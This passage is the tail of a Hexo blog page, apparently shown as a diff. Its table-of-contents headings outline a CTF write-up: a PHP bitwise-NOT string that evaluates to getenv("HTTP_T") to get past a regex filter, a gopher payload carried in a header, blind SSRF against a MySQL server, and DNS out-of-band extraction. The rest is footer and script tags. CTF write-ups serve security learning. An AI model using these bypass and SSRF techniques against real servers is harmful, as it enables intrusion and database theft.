class="nav-number">1.2.42.</span> <span class="nav-text">结合~技巧和&lt;技巧：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#与readfile-quot-co-lt-lt-quot-相同"><span class="nav-number">1.2.43.</span> <span class="nav-text">(与readfile(&quot;co&lt;&lt;&quot;)相同)</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Step-3"><span class="nav-number">1.2.44.</span> <span class="nav-text">Step 3</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#config-php的内容告诉我们flag是在MySQL-数据库中，我们接下来的目标是去查询MySQL-Server并且获取结果。"><span class="nav-number">1.2.45.</span> <span class="nav-text">config.php的内容告诉我们flag是在MySQL 数据库中，我们接下来的目标是去查询MySQL Server并且获取结果。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#并且我们知道这个user是admin并且密码是空的，因此我们可以用gopher-协议来SSRF去查询mysql-server。"><span class="nav-number">1.2.46.</span> <span class="nav-text">并且我们知道这个user是admin并且密码是空的，因此我们可以用gopher://协议来SSRF去查询mysql server。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#但是gopher的payload是十分长的，因此我们首先需要去绕过这个正则表达式。"><span class="nav-number">1.2.47.</span> <span class="nav-text">但是gopher的payload是十分长的，因此我们首先需要去绕过这个正则表达式。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#如果你尝试去搜索全部的PHP函数，并且满足这个正则规则和长度限制，你将会发现一个可用的函数getenv"><span class="nav-number">1.2.48.</span> <span class="nav-text">如果你尝试去搜索全部的PHP函数，并且满足这个正则规则和长度限制，你将会发现一个可用的函数getenv()</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#这个函数会返回一个特别的头部值。"><span class="nav-number">1.2.49.</span> <span class="nav-text">这个函数会返回一个特别的头部值。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#因此我们能将我们的gopher的payload放到这个HTTP-header"><span class="nav-number">1.2.50.</span> <span class="nav-text">因此我们能将我们的gopher的payload放到这个HTTP header:</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#98-9A-8B-9A-91-89-B7-AB-AB-AF-A0-AB-length-18"><span class="nav-number">1.2.51.</span> <span class="nav-text">(~%98%9A%8B%9A%91%89)(~%B7%AB%AB%AF%A0%AB) (length: 18)</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#它等价于getenv-quot-HTTP-T-quot-。"><span class="nav-number">1.2.52.</span> <span class="nav-text">它等价于getenv(&quot;HTTP_T&quot;)。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Step-4"><span class="nav-number">1.2.53.</span> <span class="nav-text">Step 4</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#现在我们可以SSRF："><span class="nav-number">1.2.54.</span> <span class="nav-text">现在我们可以SSRF：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#现在，您有一个盲目的SSRF！"><span class="nav-number">1.2.55.</span> <span class="nav-text">现在，您有一个盲目的SSRF！</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#对于MySQL协议，可以使用Gopherus之类的一些工具来创建gopher负载。"><span class="nav-number">1.2.56.</span> <span class="nav-text">对于MySQL协议，可以使用Gopherus之类的一些工具来创建gopher负载。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#最后，您只需要使用基于时间或带外（DNS日志）的方法来提取查询结果。"><span class="nav-number">1.2.57.</span> <span class="nav-text">最后，您只需要使用基于时间或带外（DNS日志）的方法来提取查询结果。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#最后的脚本："><span class="nav-number">1.2.58.</span> <span class="nav-text">最后的脚本：</span></a></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Ljdd520</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count">100k</span>
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
